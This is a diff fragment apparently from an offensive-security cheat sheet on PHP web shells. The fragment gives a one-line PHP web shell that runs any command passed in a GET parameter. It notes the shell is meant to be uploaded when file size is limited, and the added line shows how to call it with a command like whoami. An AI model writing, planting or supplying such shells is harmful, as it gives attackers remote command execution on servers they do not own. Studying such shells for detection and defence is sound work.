@@ -75,7 +75,7 @@ d. `<script language="php"> echo 'sample'; </script>` - PHP < 7.0.0
 > I use this when we need to  upload a shell with very small file size
 
 	<?=`$_GET[1]`?>
-> This is a shorthand notation for `<?php echo shell_exec($_GET['1']);?>`. But note that this only works if `shell_exec` is not in the `DISABLE_FUNCTIONS` in phpinfo.
+> This is a shorthand notation for `<?php echo shell_exec($_GET['1']);?>`. But note that this only works if `shell_exec` is not in the `DISABLE_FUNCTIONS` in phpinfo. To access this, just /shell.php?1=whoami
 
 5. Include
 > Used for bypassing file size as well due to its small size.
